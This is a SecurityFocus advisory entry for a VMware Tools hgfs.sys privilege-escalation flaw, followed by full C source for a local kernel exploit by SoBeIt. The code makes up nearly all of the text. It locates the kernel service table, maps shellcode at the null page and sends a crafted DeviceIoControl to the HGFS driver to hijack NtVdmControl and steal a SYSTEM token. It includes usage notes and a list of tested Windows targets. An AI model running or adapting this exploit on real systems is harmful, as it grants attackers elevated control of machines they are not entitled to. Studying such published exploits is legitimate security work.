source: http://www.securityfocus.com/bid/26556/info

VMware Tools is prone to a privilege-escalation vulnerability.

The application fails to properly drop privileges before performing certain functions. An attacker can exploit this in the guest opertaing system to elevate privileges in the host operating system. 

/*
        VMware Tools hgfs.sys Local Privilege Escalation Vulnerability Exploit
                        Created by SoBeIt

        Main file of exploit

        Tested on:

        Windows XP PRO SP2 Chinese
        Windows XP PRO SP2 English
        Windows 2003 PRO SP1 Chinese
        Windows 2003 PRO SP1 English
        
        Usage:vmware.exe
*/

#include <stdio.h>
#include <windows.h>
#include <psapi.h>
        
#pragma comment (lib, "advapi32.lib")

#define NTSTATUS        int
#define ProcessBasicInformation        0
#define SystemModuleInformation 11
        
typedef NTSTATUS (NTAPI *ZWVDMCONTROL)(ULONG, PVOID);
typedef NTSTATUS (NTAPI *ZWQUERYINFORMATIONPROCESS)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *ZWALLOCATEVIRTUALMEMORY)(HANDLE, PVOID *, ULONG, PULONG, ULONG, ULONG);
typedef PIMAGE_NT_HEADERS (NTAPI *RTLIMAGENTHEADER)(PVOID);
typedef PVOID (NTAPI *RTLIMAGEDIRECTORYENTRYTODATA)(PVOID, ULONG, USHORT, PULONG);

ZWVDMCONTROL        ZwVdmControl;
ZWQUERYINFORMATIONPROCESS        ZwQueryInformationProcess;
ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;
ZWALLOCATEVIRTUALMEMORY ZwAllocateVirtualMemory;
RTLIMAGENTHEADER RtlImageNtHeader;
RTLIMAGEDIRECTORYENTRYTODATA RtlImageDirectoryEntryToData;

typedef struct _IMAGE_FIXUP_ENTRY {
        USHORT        Offset:12;
  USHORT        Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef struct _PROCESS_BASIC_INFORMATION {
      NTSTATUS ExitStatus;
      PVOID PebBaseAddress;
      ULONG AffinityMask;
      ULONG BasePriority;
      ULONG UniqueProcessId;
      ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG Reserved[2];
        PVOID Base;
        ULONG Size;
        ULONG Flags;
        USHORT Index;
        USHORT Unknow;
        USHORT LoadCount;
        USHORT ModuleNameOffset;
        char ImageName[256];        
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

unsigned char kfunctions[64][64] = 
{
                                                        //ntoskrnl.exe
        {"ZwTerminateProcess"},
        {"PsLookupProcessByProcessId"},
        {""},
};

unsigned char shellcode[] = 
                "\x90\x60\x9c\xe9\xc4\x00\x00\x00\x5f\x4f\x47\x66\x81\x3f\x90\xcc"
                "\x75\xf8\x66\x81\x7f\x02\xcc\x90\x75\xf0\x83\xc7\x04\xbe\x38\xf0"
                "\xdf\xff\x8b\x36\xad\xad\x48\x81\x38\x4d\x5a\x90\x00\x75\xf7\x95"
                "\x8b\xf7\x6a\x02\x59\xe8\x4d\x00\x00\x00\xe2\xf9\x8b\x4e\x0c\xe8"
                "\x29\x00\x00\x00\x50\x8b\x4e\x08\xe8\x20\x00\x00\x00\x5a\x8b\x7e"
                "\x1c\x8b\x0c\x3a\x89\x0c\x38\x56\x8b\x7e\x14\x8b\x4e\x18\x8b\x76"
                "\x10\xf3\xa4\x5e\x33\xc0\x50\x50\xff\x16\x9d\x61\xc3\x83\xec\x04"
                "\x8d\x2c\x24\x55\x51\xff\x56\x04\x85\xc0\x0f\x85\x80\x8f\x00\x00"
                "\x8b\x45\x00\x83\xc4\x04\xc3\x51\x56\x8b\x75\x3c\x8b\x74\x2e\x78"
                "\x03\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x03\xc5\x33"
                "\xdb\x0f\xbe\x10\x85\xd2\x74\x08\xc1\xcb\x07\x03\xda\x40\xeb\xf1"
                "\x3b\x1f\x75\xe7\x5e\x8b\x5e\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e"
                "\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xab\x5e\x59\xc3\xe8\x37\xff\xff"
                "\xff\x90\x90\x90"

                "\x90\xcc\xcc\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x90\x90\xcc";
        
void ErrorQuit(char *msg)
{
        printf("%s:%d\n", msg, GetLastError());
        ExitProcess(0);
}

void GetFunction()
{
        HANDLE        hNtdll;
        
        hNtdll = LoadLibrary("ntdll.dll");
        if(hNtdll == NULL)
                ErrorQuit("LoadLibrary failed.\n");

        ZwVdmControl = (ZWVDMCONTROL)GetProcAddress(hNtdll, "ZwVdmControl");
        if(ZwVdmControl == NULL)
                ErrorQuit("GetProcAddress failed.\n");
                
        ZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "ZwQueryInformationProcess");
        if(ZwQueryInformationProcess == NULL)
                ErrorQuit("GetProcAddress failed.\n");
                
        ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
        if(ZwQuerySystemInformation == NULL)
                ErrorQuit("GetProcessAddress failed.\n");
                
        ZwAllocateVirtualMemory = (ZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
        if(ZwAllocateVirtualMemory == NULL)
                ErrorQuit("GetProcAddress failed.\n");

        RtlImageNtHeader = (RTLIMAGENTHEADER)GetProcAddress(hNtdll, "RtlImageNtHeader");
        if(RtlImageNtHeader == NULL)
                ErrorQuit("GetProcAddress failed.\n");
                
        RtlImageDirectoryEntryToData = (RTLIMAGEDIRECTORYENTRYTODATA)GetProcAddress(hNtdll, "RtlImageDirectoryEntryToData");
        if(RtlImageDirectoryEntryToData == NULL)
                ErrorQuit("GetProcAddress failed.\n");
                
        FreeLibrary(hNtdll);
}

ULONG GetKernelBase(char *KernelName)
{
        ULONG        i, Byte, ModuleCount, KernelBase;
        PVOID        pBuffer;
        PSYSTEM_MODULE_INFORMATION        pSystemModuleInformation;
        PCHAR        pName;
        
        ZwQuerySystemInformation(SystemModuleInformation, (PVOID)&Byte, 0, &Byte);
                
        if((pBuffer = malloc(Byte)) == NULL)
                ErrorQuit("malloc failed.\n");
                
        if(ZwQuerySystemInformation(SystemModuleInformation, pBuffer, Byte, &Byte))
                ErrorQuit("ZwQuerySystemInformation failed\n");
        
        ModuleCount = *(PULONG)pBuffer;
        pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)((PUCHAR)pBuffer + sizeof(ULONG));
        for(i = 0; i < ModuleCount; i++)
        {
                if((pName = strstr(pSystemModuleInformation->ImageName, "ntoskrnl.exe")) != NULL)
                {
                        KernelBase = (ULONG)pSystemModuleInformation->Base;
                        printf("Kernel is %s\n", pSystemModuleInformation->ImageName);
                        free(pBuffer);
                        strcpy(KernelName, "ntoskrnl.exe");
                        
                        return KernelBase;
                }
                
                if((pName = strstr(pSystemModuleInformation->ImageName, "ntkrnlpa.exe")) != NULL)
                {
                        KernelBase = (ULONG)pSystemModuleInformation->Base;
                        printf("Kernel is %s\n", pSystemModuleInformation->ImageName);
                        free(pBuffer);
                        strcpy(KernelName, "ntkrnlpa.exe");
                        
                        return KernelBase;
                }
                
                pSystemModuleInformation++;
        }
                
        free(pBuffer);
        return 0;
}

ULONG GetServiceTable(PVOID pImageBase, ULONG Address)
{
        PIMAGE_NT_HEADERS        pNtHeaders;
        PIMAGE_BASE_RELOCATION        pBaseRelocation;
        PIMAGE_FIXUP_ENTRY        pFixupEntry;
        ULONG        RelocationTableSize = 0;
        ULONG        Offset, i, VirtualAddress, Rva;

        Offset = Address - (ULONG)pImageBase;
        pNtHeaders = (PIMAGE_NT_HEADERS)RtlImageNtHeader(pImageBase);
        pBaseRelocation = (PIMAGE_BASE_RELOCATION)RtlImageDirectoryEntryToData(pImageBase, FALSE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &RelocationTableSize);
        if(pBaseRelocation == NULL)
                return 0;
                
        do 
        {
                pFixupEntry = (PIMAGE_FIXUP_ENTRY)((ULONG)pBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
       
                RelocationTableSize = (pBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1;
                for(i = 0; i < RelocationTableSize; i++, pFixupEntry++)
                {
                        if(pFixupEntry->Type == IMAGE_REL_BASED_HIGHLOW)
                        {
                                VirtualAddress = pBaseRelocation->VirtualAddress + pFixupEntry->Offset;
                                Rva = *(PULONG)((ULONG)pImageBase + VirtualAddress) - (ULONG)pNtHeaders->OptionalHeader.ImageBase;
                               
                                if(Rva == Offset)
                                {
                                   if (*(PUSHORT)((ULONG)pImageBase + VirtualAddress - 2) == 0x05c7)
                                                return *(PULONG)((ULONG)pImageBase + VirtualAddress + 4) - pNtHeaders->OptionalHeader.ImageBase;
                                }
                        }
                }

                *(PULONG)&pBaseRelocation += pBaseRelocation->SizeOfBlock;
       
        } while(pBaseRelocation->VirtualAddress);

        return 0;
}

ULONG ComputeHash(char *ch)
{
        ULONG ret = 0;

        while(*ch)
        {
                ret = ((ret << 25) | (ret >> 7)) + *ch++;
        }

        return ret;
}

int main(int argc, char *argv[])
{
        PVOID                pDrivers[256];
        PULONG        pStoreBuffer, pTempBuffer, pShellcode;
        PUCHAR        pRestoreBuffer, pBase, FunctionAddress;
        PROCESS_BASIC_INFORMATION pbi;
        SYSTEM_MODULE_INFORMATION        smi;
        OSVERSIONINFO        ovi;
        char                DriverName[256], KernelName[64];
        ULONG                Byte, len, i, j, k, BaseAddress, Value, KernelBase, buf[64];
        ULONG                HookAddress, SystemId, TokenOffset, Sections, Pid, FunctionNumber;
        ULONG                SSTOffset, AllocationSize;
        HANDLE        hDevice, hKernel;

        printf("\n VMware Tools hgfs.sys Local Privilege Escalation Vulnerability Exploit \n\n");
        printf("\t Create by SoBeIt. \n\n");
        if(argc != 1)
        {
                printf(" Usage:%s \n\n", argv[0]);
                return 1;
        }
        
        GetFunction();

        if(ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))
                ErrorQuit("ZwQueryInformationProcess failed\n");

        KernelBase = GetKernelBase(KernelName);
        if(!KernelBase)
                ErrorQuit("Unable to get kernel base address.\n");
                
        printf("Kernel base address: %x\n", KernelBase);
        
        ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        
        if(!GetVersionEx(&ovi))
                ErrorQuit("GetVersionEx failed.\n");
        
        if(ovi.dwMajorVersion != 5)
                ErrorQuit("Not Windows NT family OS.\n");
                
        printf("Major Version:%d Minor Version:%d\n", ovi.dwMajorVersion, ovi.dwMinorVersion);
        switch(ovi.dwMinorVersion)
        {
                case 1:                                                //WindowsXP
                        SystemId = 4;
                        TokenOffset = 0xc8;
                        break;
                        
                case 2:                                                //Windows2003
                        SystemId = 4;
                        TokenOffset = 0xc8;
                        break;
                        
                default:
                        SystemId = 8;
                        TokenOffset = 0xc8;
        }
        
        pRestoreBuffer = malloc(0x100);
        if(pRestoreBuffer == NULL)
                ErrorQuit("malloc failed.\n");
                
        hKernel = LoadLibrary(KernelName);
        if(hKernel == NULL)
                ErrorQuit("LoadLibrary failed.\n");

        printf("Load Base:%x\n", (ULONG)hKernel);
        SSTOffset = GetServiceTable(hKernel, (ULONG)GetProcAddress(hKernel, "KeServiceDescriptorTable"));
        SSTOffset += KernelBase;
        printf("SystemServiceTable Offset:%x\n", SSTOffset);
        FunctionNumber = *(PULONG)((ULONG)ZwVdmControl + 1);
        printf("NtVdmControl funciton number:%x\n", FunctionNumber);
        HookAddress = (ULONG)(SSTOffset + FunctionNumber * 4);
        printf("NtVdmCotrol function entry address:%x\n", HookAddress);

        AllocationSize = 0x1000;
        pStoreBuffer = (PULONG)0x7;
        if(ZwAllocateVirtualMemory((HANDLE)0xffffffff, &pStoreBuffer, 0, &AllocationSize,
                                MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE))
                ErrorQuit("ZwAllocateVirtualMemory failed.\n");

        FunctionAddress = (PUCHAR)GetProcAddress(hKernel, "NtVdmControl");
        if(FunctionAddress == NULL)
                ErrorQuit("GetProcAddress failed.\n");
                
        *(PULONG)pRestoreBuffer = FunctionAddress - (PUCHAR)hKernel + KernelBase;
        
        memset((PVOID)0x0, 0x90, AllocationSize);

        hDevice = CreateFile("\\\\.\\HGFS", FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if(hDevice == INVALID_HANDLE_VALUE)
                ErrorQuit("CreateFile failed.\n");
                                        
        pShellcode = (PULONG)shellcode;
        for(k = 0; pShellcode[k++] != 0x90cccc90; )
                                ;

        for(j = 0; kfunctions[j][0] != '\x0'; j++)
                buf[j] = ComputeHash(kfunctions[j]);

        buf[j++] = pbi.InheritedFromUniqueProcessId;
        buf[j++] = SystemId;
        buf[j++] = (ULONG)pRestoreBuffer;
        buf[j++] = HookAddress;
        buf[j++] = 0x4;
        buf[j++] = TokenOffset;
        
        memcpy((char *)(pShellcode + k), (char *)buf, j * 4);
        memcpy((PUCHAR)pStoreBuffer + 0x20, shellcode, sizeof(shellcode) - 1);

        pTempBuffer = malloc(0x1000);
        memset(pTempBuffer, 0x44, 0x1000);
        
        DeviceIoControl(hDevice, 0x14018F, (PVOID)HookAddress, 0x4, pTempBuffer, 0x4, &Byte, NULL);

        CloseHandle(hDevice);
        CloseHandle(hKernel);

        printf("Exploitation finished.\n");
        ZwVdmControl(0, NULL);

        return 1;
}
//
